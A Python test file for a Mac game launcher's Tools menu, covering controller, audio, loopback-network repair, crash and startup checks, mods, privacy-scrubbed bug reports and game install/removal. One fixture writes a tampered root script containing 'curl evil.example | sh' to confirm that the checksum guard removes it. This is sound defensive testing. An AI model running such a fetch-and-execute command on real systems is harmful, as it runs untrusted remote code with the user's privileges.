"""Tests for scripts/tools.py (the launcher's Tools menu and auto-fixes), in throwaway homes.

Admin actions run with RECLAIMER_TOOLS_DRYRUN=1, which prints the command instead of asking for a password, so the
real network startup task is never touched. Run: /usr/bin/python3 -I -m unittest discover -s tests
"""
import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
import zipfile
from pathlib import Path
from unittest import mock

REPO = Path(__file__).resolve().parent.parent
TOOLS = REPO / "scripts" / "tools.py"
WORKSHOP = Path("prefix-wine/drive_c/Program Files (x86)/Steam/steamapps/workshop")


class ToolsTest(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.home = self.tmp / "Games" / "ProjectReclaimer"
        for d in ("game", "logs", "tools", WORKSHOP / "content" / "976730"):
            (self.home / d).mkdir(parents=True)
        # the helper scripts sit next to tools.py in an install's game folder
        for f in ("workshop_helper.py", "presets.py", "fit.py", "reclaimer-loopback.sh",
                  "local.projectreclaimer.loopback.plist"):
            shutil.copy(REPO / "scripts" / f, self.home / "game" / f)
        shutil.copy(TOOLS, self.home / "game" / "tools.py")
        self.apps = self.tmp / "Applications"
        (self.apps / "Project Reclaimer.app" / "Contents").mkdir(parents=True)
        self.desktop = self.tmp / "Desktop"
        self.desktop.mkdir()
        self.daemon = self.tmp / "local.projectreclaimer.loopback.plist"  # stands in for /Library/LaunchDaemons/…
        self.daemon.write_text("<plist/>")
        self.env = dict(os.environ, RECLAIMER_HOME=str(self.home), RECLAIMER_TOOLS_DRYRUN="1",
                        RECLAIMER_TEST_DAEMON_PLIST=str(self.daemon),
                        RECLAIMER_APPS_DIR=str(self.apps), RECLAIMER_DESKTOP=str(self.desktop),
                        RECLAIMER_GAME_PROCESS=r"project-reclaimer-v9\.9\.99\.exe game-client")

    def tearDown(self):
        shutil.rmtree(self.tmp)

    def run_tool(self, *args, **env):
        p = subprocess.run([sys.executable, "-I", str(self.home / "game" / "tools.py"), *args],
                           env=dict(self.env, **env), capture_output=True, text=True, timeout=60)
        return p.returncode, p.stdout.splitlines()

    def load(self):
        patcher = mock.patch.dict(os.environ, self.env)
        patcher.start()
        self.addCleanup(patcher.stop)
        spec = importlib.util.spec_from_file_location("tools", self.home / "game" / "tools.py")
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        return mod

    def add_mod(self, wid, title, size):
        d = self.home / WORKSHOP / "content" / "976730" / wid
        d.mkdir()
        (d / "ModInfo.json").write_text(json.dumps({"Title": {"Neutral": title}}))
        (d / "data.bin").write_bytes(b"x" * size)
        (d / ".reclaimer-complete").write_text('{"timeupdated": 1, "manifest": "1"}')
        return d

    # ---- controllers -------------------------------------------------------------------------------------------
    def test_controller_check_reports_a_stuck_macos_controller_service(self):
        # macOS's gamecontrollerd can get stuck in the kernel (state U): every app that looks for controllers then
        # hangs, so Wine never lists the controller and the game ignores it although Bluetooth says connected
        t = self.load()
        with mock.patch.object(t, "gamecontrollerd_state", return_value="Us"), mock.patch.object(t.time, "sleep"):
            self.assertEqual(t.controller_check(), "stuck")

    def test_controller_check_ignores_a_moment_of_waiting(self):
        t = self.load()
        with mock.patch.object(t, "gamecontrollerd_state", side_effect=["Us", "Ss", "Us"]), \
                mock.patch.object(t.time, "sleep"):
            self.assertEqual(t.controller_check(), "ok")
        for state in ("Ss", None):  # healthy, or not running at all (macOS starts it when needed)
            with mock.patch.object(t, "gamecontrollerd_state", return_value=state), mock.patch.object(t.time, "sleep"):
                self.assertEqual(t.controller_check(), "ok")

    def test_gamecontrollerd_state_reads_the_process_list(self):
        t = self.load()
        ps = "Ss   /usr/sbin/bluetoothd\nUs   /usr/libexec/gamecontrollerd\n"
        with mock.patch.object(t.subprocess, "run", return_value=mock.Mock(stdout=ps)):
            self.assertEqual(t.gamecontrollerd_state(), "Us")
        with mock.patch.object(t.subprocess, "run", return_value=mock.Mock(stdout="Ss   /usr/sbin/bluetoothd\n")):
            self.assertIsNone(t.gamecontrollerd_state())

    def test_controller_check_command(self):
        rc, out = self.run_tool("controller-check")
        self.assertEqual(rc, 0)
        self.assertIn(out[-1], ("ok", "stuck"))

    # ---- sound -------------------------------------------------------------------------------------------------
    SPEAKERS = ("MacBook Pro Speakers", True, "coreaudio_device_type_builtin")
    AIRPODS = ("Chris AirPods Pro", False, "coreaudio_device_type_bluetooth")
    TEAMS = ("Microsoft Teams Audio", False, "coreaudio_device_type_virtual")

    def audio(self, devices, muted=False):
        t = self.load()
        with mock.patch.object(t, "output_devices", return_value=devices), \
                mock.patch.object(t, "output_muted", return_value=muted):
            return t.audio_check()

    def test_audio_check_says_where_the_sound_goes(self):
        # the game keeps the output it starts with, so the window shows it before Play
        self.assertEqual(self.audio([self.SPEAKERS, self.TEAMS]), "ok\tMacBook Pro Speakers")
        airpods_chosen = [self.SPEAKERS[:1] + (False,) + self.SPEAKERS[2:], self.AIRPODS[:1] + (True,) + self.AIRPODS[2:]]
        self.assertEqual(self.audio(airpods_chosen), "ok\tChris AirPods Pro")

    def test_audio_check_warns_about_a_muted_output(self):
        self.assertEqual(self.audio([self.SPEAKERS, self.AIRPODS], muted=True), "muted\tMacBook Pro Speakers")

    def test_audio_check_warns_about_headphones_that_are_not_the_output(self):
        # AirPods connected (e.g. from the iPhone) while the Mac still plays through its speakers: the game would
        # start on the speakers and stay there even after the AirPods are put in
        self.assertEqual(self.audio([self.SPEAKERS, self.AIRPODS, self.TEAMS]),
                         "headset\tChris AirPods Pro\tMacBook Pro Speakers")

    def test_audio_check_warns_about_a_virtual_output(self):
        teams_chosen = [self.SPEAKERS[:1] + (False,) + self.SPEAKERS[2:], self.TEAMS[:1] + (True,) + self.TEAMS[2:]]
        self.assertEqual(self.audio(teams_chosen), "virtual\tMicrosoft Teams Audio")

    def test_audio_check_is_quiet_when_macos_cannot_tell(self):
        self.assertEqual(self.audio([]), "ok")
        self.assertEqual(self.audio([self.SPEAKERS], muted=None), "ok\tMacBook Pro Speakers")

    def test_output_devices_reads_system_profiler(self):
        t = self.load()
        profile = json.dumps({"SPAudioDataType": [{"_items": [
            {"_name": "MacBook Pro Microphone", "coreaudio_device_input": 1,
             "coreaudio_device_transport": "coreaudio_device_type_builtin"},
            {"_name": "MacBook Pro Speakers", "coreaudio_default_audio_output_device": "spaudio_yes",
             "coreaudio_device_output": 2, "coreaudio_device_transport": "coreaudio_device_type_builtin"},
            {"_name": "Chris AirPods Pro", "coreaudio_device_input": 1, "coreaudio_device_output": 2,
             "coreaudio_device_transport": "coreaudio_device_type_bluetooth"}]}]})
        with mock.patch.object(t.subprocess, "run", return_value=mock.Mock(stdout=profile)):
            self.assertEqual(t.output_devices(), [self.SPEAKERS, self.AIRPODS])
        renamed = json.dumps({"SPAudioDataType": [{"_items": [
            {"_name": "Studio\tMonitors\n", "coreaudio_default_audio_output_device": "spaudio_yes",
             "coreaudio_device_output": 2, "coreaudio_device_transport": "coreaudio_device_type_usb"}]}]})
        with mock.patch.object(t.subprocess, "run", return_value=mock.Mock(stdout=renamed)):
            self.assertEqual(t.output_devices(), [("Studio Monitors", True, "coreaudio_device_type_usb")])  # (one field)
        with mock.patch.object(t.subprocess, "run", return_value=mock.Mock(stdout="not json")):
            self.assertEqual(t.output_devices(), [])
        with mock.patch.object(t.subprocess, "run", side_effect=OSError):
            self.assertEqual(t.output_devices(), [])

    def test_output_muted_reads_the_volume_settings(self):
        t = self.load()
        for answer, expected in (("true\n", True), ("false\n", False), ("", None)):
            with mock.patch.object(t.subprocess, "run", return_value=mock.Mock(stdout=answer)):
                self.assertEqual(t.output_muted(), expected)

    def test_audio_check_command(self):
        rc, out = self.run_tool("audio-check")
        self.assertEqual(rc, 0)
        self.assertIn(out[-1].split("\t")[0], ("ok", "muted", "virtual", "headset"))

    # ---- network -----------------------------------------------------------------------------------------------
    def test_net_check_needs_every_range(self):
        t = self.load()
        full = "\n".join(f"\tinet {a} netmask 0xffffffff" for a in t.EXPECTED_ALIASES)
        with mock.patch.object(t, "lo0", return_value="lo0: flags\n\tinet 127.0.0.1 netmask 0xff000000\n" + full):
            self.assertEqual(t.net_check(), "ok")
        with mock.patch.object(t, "lo0", return_value="lo0: flags\n\tinet 127.0.0.1 netmask 0xff000000\n"):
            self.assertEqual(t.net_check(), "missing")

    def test_expected_aliases_come_from_the_installed_loopback_script(self):
        script = self.home / "game" / "reclaimer-loopback.sh"
        script.write_text(script.read_text().replace("; do", " 127.0.9; do", 1))  # a range a release adds
        t = self.load()
        for prefix in ("127.0.0.", "127.0.1.", "127.0.2.", "127.3.1.", "127.0.9."):
            self.assertTrue(any(a.startswith(prefix) for a in t.EXPECTED_ALIASES), prefix)

    def test_net_fix_reinstalls_and_restarts_the_startup_task_with_one_password_prompt(self):
        rc, out = self.run_tool("net-fix")
        self.assertEqual(rc, 0, out)
        admin = [l for l in out if l.startswith("dry-run admin: ")]
        self.assertEqual(len(admin), 1, out)
        cmd = admin[0]
        self.assertEqual(subprocess.run(["/bin/sh", "-n", "-c", cmd[len("dry-run admin: "):]]).returncode, 0,
                         "not valid shell")  # ("/Library/Application Support" has a space)
        self.assertIn("/Library/LaunchDaemons/local.projectreclaimer.loopback.plist", cmd)
        self.assertIn("launchctl bootstrap system", cmd)
        self.assertIn("reclaimer-loopback.sh", cmd)
        self.assertEqual(out[-1], "ok")

    def test_net_fix_root_command_checks_what_it_installed(self):
        # the copy in the game folder is the player's to change: what runs as root at boot is checked, after copying
        # it where only root can write, against the checksum this script ships with (security review, M1)
        t = self.load()
        cmd = self.run_tool("net-fix")[1]
        cmd = next(l for l in cmd if l.startswith("dry-run admin: "))
        self.assertIn(t.LOOPBACK_SHA, cmd)
        self.assertIn(t.LOOPBACK_PLIST_SHA, cmd)
        self.assertLess(cmd.index("install -o root"), cmd.index("shasum"))
        # the check itself, run on stand-ins for the two root-owned copies: right files pass, a swapped one is removed
        check = cmd[cmd.index("{ printf"):cmd.index("&& { launchctl")]
        for swapped in (False, True):
            d = self.tmp / f"root-{swapped}"
            d.mkdir()
            script, plist = d / "reclaimer-loopback.sh", d / "loopback.plist"
            shutil.copy(REPO / "scripts" / "reclaimer-loopback.sh", script)
            shutil.copy(REPO / "scripts" / "local.projectreclaimer.loopback.plist", plist)
            if swapped:
                script.write_text("#!/bin/sh\ncurl evil.example | sh\n")
            run = check.replace(t.quoted(t.DAEMON_DIR + "/reclaimer-loopback.sh"), t.quoted(script)) \
                       .replace(t.DAEMON_PLIST, t.quoted(plist))
            rc = subprocess.run(["/bin/sh", "-c", run], capture_output=True).returncode
            self.assertEqual(rc != 0, swapped, run)
            self.assertEqual(script.exists(), not swapped)

    def test_net_fix_restarts_the_installed_task_without_reinstalling_it(self):
        # the root-owned copy is already right: only restart it, so no file of the player's goes to root at all
        daemon_dir = self.tmp / "daemon-dir"
        daemon_dir.mkdir()
        shutil.copy(REPO / "scripts" / "reclaimer-loopback.sh", daemon_dir / "reclaimer-loopback.sh")
        shutil.copy(REPO / "scripts" / "local.projectreclaimer.loopback.plist", self.daemon)
        rc, out = self.run_tool("net-fix", RECLAIMER_TEST_DAEMON_DIR=str(daemon_dir))
        cmd = next(l for l in out if l.startswith("dry-run admin: "))
        self.assertNotIn("install -o root", cmd)
        self.assertIn("launchctl bootstrap system", cmd)

    def test_shipped_checksums_match_the_network_files(self):
        t = self.load()
        sha = lambda f: subprocess.run(["shasum", "-a", "256", str(REPO / "scripts" / f)], capture_output=True,
                                       text=True).stdout.split()[0]
        self.assertEqual(t.LOOPBACK_SHA, sha("reclaimer-loopback.sh"))
        self.assertEqual(t.LOOPBACK_PLIST_SHA, sha("local.projectreclaimer.loopback.plist"))
        install = (REPO / "install.sh").read_text()
        self.assertIn(f"LOOPBACK_SHA={t.LOOPBACK_SHA}", install)
        self.assertIn(f"LOOPBACK_PLIST_SHA={t.LOOPBACK_PLIST_SHA}", install)

    def test_admin_prompt_keeps_non_ascii_paths(self):
        # json.dumps escaped é as \u00e9, which AppleScript rejects: net-fix failed for such install paths
        t = self.load()
        script = t.admin_script("ls '/Users/José/Games'", "Project Reclaimer")
        self.assertIn("José", script)
        self.assertNotIn("\\u00e9", script)
        self.assertEqual(subprocess.run(["/usr/bin/osacompile", "-o", str(self.tmp / "x.scpt"), "-e", script],
                                        capture_output=True).returncode, 0, script)

    # ---- crash check -------------------------------------------------------------------------------------------
    def test_crash_check(self):
        log = self.home / "logs" / "client-wine.log"
        log.write_text("Menu loading screen finished.\n")
        self.assertEqual(self.run_tool("crash-check")[1][-1], "ok")
        log.write_text("...\nYour graphics card stopped responding, so the game had to close.\n")
        self.assertTrue(self.run_tool("crash-check")[1][-1].startswith("crash: The graphics card stopped"))
        log.write_text("thread 'main' panicked at src/thing.rs:1:2:\nboom\n")
        self.assertTrue(self.run_tool("crash-check")[1][-1].startswith("crash: Project Reclaimer hit an error"))

    # ---- startup state (the watchdog) --------------------------------------------------------------------------

    def start_fake_game(self):
        game = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)",
                                 "project-reclaimer-v9.9.99.exe game-client"])

        def stop():  # (kill and reap, so no ResourceWarning about a still-running child)
            game.kill()
            game.wait()

        self.addCleanup(stop)
        time.sleep(0.2)  # (pgrep needs the process to have registered)
        return game

    def write_log(self, text):
        (self.home / "logs" / "client-wine.log").write_text(text)

    def write_cache(self, payload=b""):
        """A Forge cache file under the prefix user, the way the build writes them."""
        folder = (self.home / "prefix-wine/drive_c/users/player/AppData/Local/ProjectReclaimer"
                  "/forge-maps/virtual/x")
        folder.mkdir(parents=True, exist_ok=True)
        (folder / "130_epilogue.map").write_bytes(payload)
        return folder

    def startup(self, **env):
        return json.loads(self.run_tool("startup-state", **env)[1][-1])

    def test_startup_state_is_stopped_when_the_game_is_not_running(self):
        self.write_log("Forge library: building it while the game starts.\n")
        self.assertEqual(self.startup()["state"], "stopped")

    def test_startup_state_with_nothing_installed_reports_stopped(self):
        # no prefix, no log, no cache (a first run, or an install that stopped partway): the probe must answer, not
        # crash, and must not invent a state
        shutil.rmtree(self.home / "prefix-wine")
        shutil.rmtree(self.home / "logs")
        state = self.startup()
        self.assertEqual(state["state"], "stopped")
        self.assertIsNone(state["elapsed_s"])
        self.assertEqual(state["forge_cache"], {"bytes": 0, "files": 0, "newest_age_s": None})

    def test_startup_state_is_ready_once_the_loading_screen_finishes(self):
        self.start_fake_game()
        self.write_log("Menu loading screen finished.\n")
        self.assertEqual(self.startup()["state"], "ready")

    def test_startup_state_is_building_while_the_library_is_written(self):
        self.start_fake_game()
        self.write_log("Forge library: building it while the game starts.\n")
        self.assertEqual(self.startup()["state"], "building")

    def test_startup_state_names_a_stall_when_nothing_is_written_this_run(self):
        self.write_cache()  # (a leftover from an earlier run: nothing written since this start)
        time.sleep(1.2)  # (ps reports elapsed in whole seconds, so make the ordering unambiguous)
        self.start_fake_game()
        self.write_log("Forge library: building it while the game starts.\n")
        state = self.startup(RECLAIMER_STALL_SECONDS="0")
        self.assertEqual(state["state"], "stalled")
        self.assertFalse(state["wrote_this_run"])
        self.assertIn("Forge asset library", state["detail"])

    def test_startup_state_is_not_stalled_before_the_threshold(self):
        self.write_cache()  # (an older build's cache: nothing written this run)
        time.sleep(1.2)  # (as above: the cache has to be clearly before this start)
        self.start_fake_game()
        self.write_log("Forge library: building it while the game starts.\n")
        state = self.startup(RECLAIMER_STALL_SECONDS="3600")
        self.assertEqual(state["state"], "building")  # (too soon to call it a stall)

    def test_startup_state_is_not_stalled_while_the_cache_is_writing(self):
        self.start_fake_game()
        time.sleep(1.2)  # (as above: the write has to be clearly after the start)
        self.write_log("Forge library: building it while the game starts.\n")
        self.write_cache(payload=b"x" * 10)  # (written after this start)
        state = self.startup(RECLAIMER_STALL_SECONDS="0")
        self.assertTrue(state["wrote_this_run"])
        self.assertEqual(state["state"], "building")

    # ---- mods --------------------------------------------------------------------------------------------------
    def test_mods_lists_titles_sizes_and_free_space(self):
        self.add_mod("111", "Warlock", 3000)
        self.add_mod("222", "Lockout", 1000)
        rc, out = self.run_tool("mods")
        data = json.loads(out[-1])
        self.assertGreater(data["free_bytes"], 0)
        self.assertEqual([(m["id"], m["title"]) for m in data["mods"]], [("111", "Warlock"), ("222", "Lockout")])
        self.assertGreaterEqual(data["mods"][0]["bytes"], 3000)

    def test_remove_mod_deletes_it_and_its_status(self):
        d = self.add_mod("111", "Warlock", 10)
        (self.home / "logs" / "mods").mkdir()
        (self.home / "logs" / "mods" / "111.json").write_text("{}")
        t = self.load()
        with mock.patch.object(t.helper(), "write_manifest") as manifest:
            self.assertEqual(t.remove_mod("111"), "ok")
        self.assertFalse(d.exists())
        self.assertFalse((self.home / "logs" / "mods" / "111.json").exists())
        self.assertTrue(manifest.called)  # the game must stop counting it as installed

    def test_remove_mod_refuses_while_the_game_runs_and_rejects_odd_ids(self):
        self.add_mod("111", "Warlock", 10)
        game = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)",
                                 "project-reclaimer-v9.9.99.exe game-client"])
        try:
            self.assertEqual(self.run_tool("remove-mod", "111")[1][-1], "error: Quit the game first.")
        finally:
            game.kill()
        self.assertTrue(self.run_tool("remove-mod", "../../etc")[1][-1].startswith("error: "))

    # ---- report ------------------------------------------------------------------------------------------------
    def test_report_zips_logs_without_the_steam_account(self):
        (self.home / "steam-account").write_text("SecretName\n")
        (self.home / "version").write_text("1.2.0\n")
        (self.home / "logs" / "launcher.log").write_text("launcher steam: done(\"Signed in as SecretName\")\n")
        (self.home / "logs" / "client-wine.log").write_text("Menu loading screen finished.\n")
        rc, out = self.run_tool("report")
        self.assertTrue(out[-1].startswith("ok "), out)
        path = Path(out[-1][3:])
        self.assertEqual(path.parent, self.desktop)
        with zipfile.ZipFile(path) as z:
            names = z.namelist()
            text = "".join(z.read(n).decode("utf-8", "replace") for n in names)
        self.assertIn("client-wine.log", " ".join(names))
        self.assertIn("summary.txt", names)
        self.assertIn("1.2.0", text)
        self.assertNotIn("SecretName", text)
        self.assertNotIn("steam-account", " ".join(names))

    def test_report_includes_the_startup_state_and_the_forge_cache(self):
        # a stalled start: the build marker is logged, the cache was last written before this run, long enough ago
        (self.home / "steam-account").write_text("SecretName\n")
        self.write_cache(payload=b"x" * 4096)
        time.sleep(1.2)  # (ps reports elapsed in whole seconds, so make the cache clearly older than the start)
        self.start_fake_game()
        self.write_log("Forge library: building it while the game starts.\n")
        rc, out = self.run_tool("report", RECLAIMER_STALL_SECONDS="0")
        self.assertEqual(rc, 0, out)
        with zipfile.ZipFile(Path(out[-1][3:])) as z:
            text = "".join(z.read(n).decode("utf-8", "replace") for n in z.namelist())
        self.assertIn("Startup: stalled", text)
        self.assertIn("stall threshold 0 s", text)
        self.assertIn("Forge cache: 4096 bytes in 1 file", text)
        self.assertIn("no cache writes this run", text)
        self.assertNotIn("SecretName", text)  # (the report is made to be shared)

    def test_report_carries_the_startup_state_as_data(self):
        self.write_cache(payload=b"x" * 4096)
        time.sleep(1.2)  # (as above: the cache is from an earlier run)
        self.start_fake_game()
        self.write_log("Forge library: building it while the game starts.\n")
        rc, out = self.run_tool("report", RECLAIMER_STALL_SECONDS="0")
        self.assertEqual(rc, 0, out)
        with zipfile.ZipFile(Path(out[-1][3:])) as z:
            startup = json.loads(z.read("startup-state.json"))
        self.assertEqual(startup["state"], "stalled")
        self.assertEqual(startup["stall_after_s"], 0)
        self.assertGreaterEqual(startup["elapsed_s"], 0)
        self.assertFalse(startup["wrote_this_run"])
        self.assertEqual(startup["forge_cache"]["bytes"], 4096)
        self.assertEqual(startup["forge_cache"]["files"], 1)
        self.assertGreaterEqual(startup["forge_cache"]["newest_age_s"], 1)

    def test_report_still_works_when_the_game_has_never_run(self):
        # no game process, no Forge cache, no log: the report must still be made
        rc, out = self.run_tool("report")
        self.assertEqual(rc, 0, out)
        self.assertTrue(out[-1].startswith("ok "), out)
        with zipfile.ZipFile(Path(out[-1][3:])) as z:
            startup = json.loads(z.read("startup-state.json"))
            summary = z.read("summary.txt").decode()
        self.assertEqual(startup["state"], "stopped")
        self.assertEqual(startup["elapsed_s"], None)
        self.assertEqual(startup["forge_cache"], {"bytes": 0, "files": 0, "newest_age_s": None})
        self.assertIn("Startup: stopped", summary)
        self.assertIn("Forge cache: 0 bytes in 0 files, never written", summary)

    def test_report_still_works_when_the_startup_check_fails(self):
        t = self.load()
        with mock.patch.object(t, "startup_state", side_effect=RuntimeError("the probe broke")):
            result = t.report()
        self.assertTrue(result.startswith("ok "), result)
        with zipfile.ZipFile(Path(result[3:])) as z:
            summary = z.read("summary.txt").decode()
            names = z.namelist()
        self.assertIn("Startup: unknown (the startup check failed)", summary)
        self.assertNotIn("startup-state.json", names)  # (no invented verdict)
        self.assertNotIn("the probe broke", summary)  # (an error's own words can name paths)
    def test_report_leaves_out_the_mac_user_name_and_logged_steam_names(self):
        (self.home / "logs" / "launcher.log").write_text(
            f"started (home {Path.home()}/Games/ProjectReclaimer)\nDepotDownloader -username OldName -remember-password\n")
        rc, out = self.run_tool("report")
        with zipfile.ZipFile(Path(out[-1][3:])) as z:
            text = "".join(z.read(n).decode("utf-8", "replace") for n in z.namelist())
        self.assertNotIn(str(Path.home()), text)
        self.assertIn("~/Games/ProjectReclaimer", text)
        self.assertNotIn("OldName", text)  # (after Forget Steam the account file is gone, but logs still name it)

    # ---- graphics / steam --------------------------------------------------------------------------------------
    def test_forget_steam(self):
        (self.home / "steam-account").write_text("RealName_1\n")
        self.assertEqual(self.run_tool("forget-steam")[1][-1], "ok")
        self.assertFalse((self.home / "steam-account").exists())

    def test_reset_graphics_writes_the_tuned_settings(self):
        profile = self.home / "prefix-wine/drive_c/users/player/Documents/My Games/Project Reclaimer"
        profile.mkdir(parents=True)
        (profile / "settings.json").write_text(json.dumps({"version": 1, "graphics": {"frame_limit": 240},
                                                           "mouse_sensitivity": 3.0}))
        rc, out = self.run_tool("reset-graphics")
        self.assertEqual(out[-1], "ok", out)
        settings = json.loads((profile / "settings.json").read_text())
        self.assertEqual(settings["graphics"]["frame_limit"], 60)
        self.assertEqual(settings["mouse_sensitivity"], 3.0)  # only graphics change

    def test_repair_and_graphics_wait_for_the_game_to_quit(self):
        # (spawned from the install's game folder so the fake counts as this installation's game either way)
        game = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)",
                                 "project-reclaimer-v9.9.99.exe game-client"],
                                cwd=str(self.home / "game"))
        try:
            # in-process so free space can be stubbed: this machine has less than add-game needs, and the
            # running-game refusal has to be what the commands hit first
            tools = self.load()
            with mock.patch.object(tools.shutil, "disk_usage", return_value=mock.Mock(free=200 * 10**9)), \
                    mock.patch.object(tools.helper(), "game_download", return_value="ok"):
                self.assertEqual(tools.repair(), "error: Quit the game first.")
                self.assertEqual(tools.add_games(["odst"]), "error: Quit the game first.")
                self.assertEqual(tools.remove_game("odst"), "error: Quit the game first.")
                self.assertEqual(tools.repair_game("halo3"), "error: Quit the game first.")
            self.assertEqual(tools.reset_graphics(), "error: Quit the game first.")
        finally:
            game.kill()
            game.wait()

    def fake_mcc(self, odst=True, halo3=True):
        mcc = self.home / "prefix-wine/drive_c/Program Files (x86)/Steam/steamapps/common/Halo The Master Chief Collection"
        (mcc / "MCC").mkdir(parents=True)
        (mcc / "MCC" / "shared.pak").write_bytes(b"x" * 500)
        (mcc / ".DepotDownloader").mkdir()
        (mcc / ".DepotDownloader" / "976731_1.manifest").write_bytes(b"m")
        if halo3:
            (mcc / "halo3").mkdir()
            (mcc / "halo3" / "halo3.dll").write_bytes(b"x" * 3000)
            for depot in ("976738_2", "976739_3"):
                (mcc / ".DepotDownloader" / f"{depot}.manifest").write_bytes(b"m")
        if odst:
            (mcc / "halo3odst").mkdir()
            (mcc / "halo3odst" / "halo3odst.dll").write_bytes(b"x" * 1000)
            (mcc / ".DepotDownloader" / "1064222_4.manifest").write_bytes(b"m")
            (mcc / ".DepotDownloader" / "1064222_4.manifest.sha").write_bytes(b"s")
        return mcc

    def test_games_lists_halo3_and_odst_with_sizes_and_folders(self):
        mcc = self.fake_mcc()
        data = json.loads(self.run_tool("games")[1][-1])
        self.assertGreater(data["free_bytes"], 0)
        self.assertGreaterEqual(data["mcc_bytes"], 4500)  # (everything in the MCC folder)
        halo3, odst = data["games"]
        self.assertEqual((halo3["id"], halo3["installed"], halo3["bytes"], halo3["path"]),
                         ("halo3", True, 3000, str(mcc / "halo3")))  # (MCC's shared files belong to neither)
        self.assertEqual((odst["id"], odst["installed"], odst["bytes"], odst["path"]),
                         ("odst", True, 1000, str(mcc / "halo3odst")))

    def test_games_without_odst(self):
        self.fake_mcc(odst=False)
        halo3, odst = json.loads(self.run_tool("games")[1][-1])["games"]
        self.assertTrue(halo3["installed"])
        self.assertEqual((odst["installed"], odst["bytes"]), (False, 0))

    def manifests(self, mcc):
        return sorted(f.name for f in (mcc / ".DepotDownloader").iterdir())

    def test_remove_odst_deletes_only_odst(self):
        mcc = self.fake_mcc()
        self.assertEqual(self.run_tool("remove-game", "odst")[1][-1], "ok")
        self.assertFalse((mcc / "halo3odst").exists())
        self.assertTrue((mcc / "halo3" / "halo3.dll").exists())
        self.assertEqual(self.manifests(mcc), ["976731_1.manifest", "976738_2.manifest", "976739_3.manifest"])
        self.assertFalse((self.home / "halo3-removed").exists())

    def test_remove_halo3_keeps_odst_and_mccs_shared_files(self):
        mcc = self.fake_mcc()
        self.assertEqual(self.run_tool("remove-game", "halo3")[1][-1], "ok")
        self.assertFalse((mcc / "halo3").exists())
        self.assertTrue((mcc / "halo3odst" / "halo3odst.dll").exists())
        self.assertTrue((mcc / "MCC" / "shared.pak").exists())
        self.assertEqual(self.manifests(mcc), ["1064222_4.manifest", "1064222_4.manifest.sha", "976731_1.manifest"])
        self.assertTrue((self.home / "halo3-removed").exists())  # (so Mac port updates don't stop on it)

    def test_remove_a_game_that_isnt_installed_or_isnt_a_game(self):
        self.fake_mcc(odst=False)
        self.assertEqual(self.run_tool("remove-game", "odst"), (1, ["error: Halo 3: ODST isn't installed."]))
        self.assertEqual(self.run_tool("remove-game", "../halo3")[1][-1], "error: That isn't a game Project Reclaimer plays.")

    def test_add_games_downloads_mcc_and_the_chosen_games(self):
        self.fake_mcc(halo3=False, odst=False)
        (self.home / "halo3-removed").write_text("")
        tools = self.load()
        with mock.patch.object(tools.helper(), "game_download", return_value="ok") as download, \
                mock.patch.object(tools.shutil, "disk_usage", return_value=mock.Mock(free=200 * 10**9)):
            self.assertEqual(tools.add_games(["odst"]), "ok")
            download.assert_called_with(str(tools.MCC_DIR), ["976731", "1064222"])
            self.assertTrue((self.home / "halo3-removed").exists())
            self.assertEqual(tools.add_games(["halo3", "odst"]), "ok")
            download.assert_called_with(str(tools.MCC_DIR), ["976731", "976738", "976739", "1064222"])
        self.assertFalse((self.home / "halo3-removed").exists())

    def test_add_games_needs_room_for_them(self):
        # a full disk used to end as a DepotDownloader error part-way through ~9 GB
        self.fake_mcc(odst=False)
        tools = self.load()
        with mock.patch.object(tools.helper(), "game_download", return_value="ok") as download, \
                mock.patch.object(tools.shutil, "disk_usage", return_value=mock.Mock(free=5 * 10**9)):
            result = tools.add_games(["odst"])
        self.assertTrue(result.startswith("error: ") and "GB" in result, result)
        download.assert_not_called()
        with mock.patch.object(tools.helper(), "game_download", return_value="ok"), \
                mock.patch.object(tools.shutil, "disk_usage", return_value=mock.Mock(free=50 * 10**9)):
            self.assertEqual(tools.add_games(["odst"]), "ok")

    def test_remove_game_explains_a_folder_it_cant_delete(self):
        mcc = self.fake_mcc()
        elsewhere = self.tmp / "elsewhere"
        shutil.move(str(mcc / "halo3odst"), elsewhere)
        (mcc / "halo3odst").symlink_to(elsewhere)  # (rmtree refuses symlinks: an error line, not a traceback)
        rc, out = self.run_tool("remove-game", "odst")
        self.assertEqual(rc, 1)
        self.assertTrue(out[-1].startswith("error: "), out)
        self.assertTrue((elsewhere / "halo3odst.dll").exists())

    def test_a_failed_halo3_download_keeps_the_removed_marker(self):
        self.fake_mcc(halo3=False)
        (self.home / "halo3-removed").write_text("")
        tools = self.load()
        with mock.patch.object(tools.helper(), "game_download", return_value="error: Couldn't reach Steam."), \
                mock.patch.object(tools.shutil, "disk_usage", return_value=mock.Mock(free=200 * 10**9)):
            self.assertEqual(tools.add_games(["halo3"]), "error: Couldn't reach Steam.")
        self.assertTrue((self.home / "halo3-removed").exists())

    def test_repair_checks_one_installed_game(self):
        self.fake_mcc(halo3=False)
        tools = self.load()
        with mock.patch.object(tools.helper(), "game_download", return_value="ok") as download:
            self.assertEqual(tools.repair_game("odst"), "ok")
            download.assert_called_once_with(str(tools.MCC_DIR), ["976731", "1064222"])
            self.assertEqual(tools.repair_game("halo3"), "error: Halo 3 isn't installed. Add it first.")
            self.assertEqual(tools.repair(), "ok")  # (every installed game: here only ODST)
            download.assert_called_with(str(tools.MCC_DIR), ["976731", "1064222"])

    # ---- server versions and rejoining ----
    def fake_wine(self, script):
        wine = self.home / "wine/Wine Staging.app/Contents/Resources/wine/bin/wine"
        wine.parent.mkdir(parents=True, exist_ok=True)
        wine.write_text("#!/bin/sh\n" + script + "\n")
        wine.chmod(0o755)
        (self.home / "game" / "project-reclaimer-v0.9.13.exe").write_bytes(b"MZ")

    def test_server_version(self):
        self.fake_wine('echo "Server queries: version 0.9.13"; echo \'{"address": "1.2.3.4:5", "name": "Star Wars", '
                       '"version": "0.9.11"}\'')
        self.assertEqual(self.run_tool("server-version", "1.2.3.4:5")[1][-1], "0.9.11 Star Wars")

    def test_server_version_name_cant_add_lines(self):
        # a server's name is the server's to choose; a newline in it used to add a fake "<version> <name>" line
        self.fake_wine("printf '%s\\n' '{\"name\": \"Evil\\n0.9.1 Fake\", \"version\": \"0.9.11\"}'")
        out = self.run_tool("server-version", "1.2.3.4:5")[1]
